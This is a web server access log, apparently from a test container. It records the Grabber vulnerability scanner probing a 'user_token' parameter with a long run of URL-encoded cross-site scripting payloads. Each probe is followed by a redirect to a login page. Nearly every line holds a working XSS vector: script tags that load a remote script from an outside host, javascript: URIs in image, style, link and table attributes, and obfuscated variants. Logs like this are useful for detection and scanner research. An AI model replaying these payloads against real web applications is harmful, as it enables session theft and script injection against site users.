172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:37 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:38 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
